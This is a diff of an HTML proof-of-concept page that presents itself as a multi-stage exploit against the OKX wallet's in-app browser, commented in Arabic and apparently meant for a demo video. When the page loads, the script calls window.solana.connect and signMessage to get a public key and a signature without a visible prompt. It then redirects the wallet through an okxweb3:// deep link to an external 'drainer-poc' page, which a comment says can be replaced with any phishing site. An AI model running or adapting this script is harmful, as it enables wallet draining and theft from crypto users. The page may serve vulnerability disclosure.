@@ -5,72 +5,65 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>⚠️ WARNING: SYSTEM EXPLOIT ⚠️</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; line-height: 1.2; overflow: hidden; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; line-height: 1.2; }
         .red { color: #ff0000; font-weight: bold; }
         .blink { animation: blinker 1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
-        #console { height: 90vh; overflow-y: auto; border: 1px solid #333; padding: 10px; background: #050505; }
-        .header { color: #555; margin-bottom: 10px; border-bottom: 1px solid #333; }
+        #console { height: 80vh; overflow-y: auto; border: 1px solid #333; padding: 10px; background: #050505; }
     </style>
 </head>
 <body>
 
-<div class="header">OKX_EXPLOIT_KERNEL [Version 6.161.0.PRODUCTION]</div>
+<div style="color: #555; margin-bottom: 10px;">OKX_MULTI_STAGE_EXPLOIT [ACTIVE]</div>
 <div id="console">
-    [!] SYSTEM_BOOT: OKX Internal Bridge Hooking...<br>
+    [!] INITIALIZING STAGE 1: SILENT DATA EXFILTRATION...<br>
 </div>
 
 <script>
     const con = document.getElementById('console');
     
     function writeLog(text, isCritical = false) {
-        const span = document.createElement('div');
-        if (isCritical) span.className = "red blink";
-        span.innerHTML = `[${new Date().toLocaleTimeString()}] ${text}`;
-        con.appendChild(span);
+        const div = document.createElement('div');
+        if (isCritical) div.className = "red blink";
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${text}`;
+        con.appendChild(div);
         con.scrollTop = con.scrollHeight;
     }
 
-    async function triggerAttack() {
-        writeLog("DApp Initialized inside OKX WebView...");
-        
-        // التحقق من وجود الجسور (Bridges)
-        const targets = ['solana', 'svm', 'okxwallet'];
-        
-        for (let target of targets) {
-            if (window[target]) {
-                writeLog(`TARGET FOUND: window.${target}`);
-                try {
-                    // 1. سرقة العنوان صمتاً (Silent Connect)
-                    writeLog(`Bypassing Permission: window.${target}.connect()...`);
-                    const wallet = await window[target].connect();
-                    writeLog(`SUCCESS: Public Key Captured -> ${wallet.publicKey.toString()}`, true);
+    async function startChainExploit() {
+        // المرحلة الأولى: السرقة الصامتة للتوقيع والعناوين
+        if (window.solana) {
+            try {
+                writeLog("Hooking window.solana...");
+                const wallet = await window.solana.connect();
+                writeLog(`SUCCESS: Public Key Captured -> ${wallet.publicKey.toString()}`, true);
 
-                    // 2. توقيع رسالة صمتاً (Identity Theft)
-                    writeLog(`Bypassing Signature: window.${target}.signMessage()...`);
-                    const msg = "CRITICAL_EXPLOIT_CONFIRMATION_" + Math.random().toString(36).substring(7);
-                    const encoded = new TextEncoder().encode(msg);
-                    
-                    // هنا تكمن الثغرة: التوقيع سيتم تلقائياً وبدون أي Popup
-                    const sig = await window[target].signMessage(encoded, 'utf8');
-                    
-                    if (sig) {
-                        writeLog("!!! CRITICAL: SILENT SIGNATURE OBTAINED !!!", true);
-                        writeLog(`SIG_DATA: ${sig.signature.toString('hex').substring(0, 40)}...`, true);
-                    }
-                } catch (e) {
-                    writeLog(`BRIDGE_ERROR [${target}]: ${e.message}`, false);
-                }
+                const msg = "AUTHORIZE_SESSION_" + Math.random().toString(36).substring(7);
+                const encoded = new TextEncoder().encode(msg);
+                const sig = await window.solana.signMessage(encoded, 'utf8');
+                
+                if (sig) writeLog("!!! STAGE 1 COMPLETE: SILENT SIGNATURE OBTAINED !!!", true);
+            } catch (e) {
+                writeLog("Stage 1 Error: " + e.message);
             }
         }
+
+        // المرحلة الثانية: فتح الرابط الضار داخل المحفظة تلقائياً
+        writeLog("<br>[!] STAGE 2: INJECTING MALICIOUS DEEP LINK...", true);
         
-        writeLog("<br>--- EXPLOIT PHASE COMPLETE ---");
-        writeLog("All data exfiltrated to remote server.");
+        // الرابط الضار (يمكنك تغييره لأي موقع تصيد أو صفحة استغلال أخرى)
+        const maliciousUrl = "https://alish244.github.io/drainer-poc"; 
+        const okxDeepLink = `okxweb3://wallet/dapp/url?dappUrl=${encodeURIComponent(maliciousUrl)}`;
+
+        setTimeout(() => {
+            writeLog(`REDIRECTING TO: ${maliciousUrl}`, true);
+            // إجبار المحفظة على فتح الرابط الجديد داخلياً
+            window.location.href = okxDeepLink;
+        }, 3000); // تأخير 3 ثوانٍ ليظهر التأثير في الفيديو
     }
 
-    // التنفيذ التلقائي بمجرد فتح الصفحة (Evil Mode)
     window.onload = () => {
-        setTimeout(triggerAttack, 1500); // تأخير بسيط ليبدو الهجوم واقعياً في الفيديو
+        setTimeout(startChainExploit, 1000);
     };
 </script>
 </body>
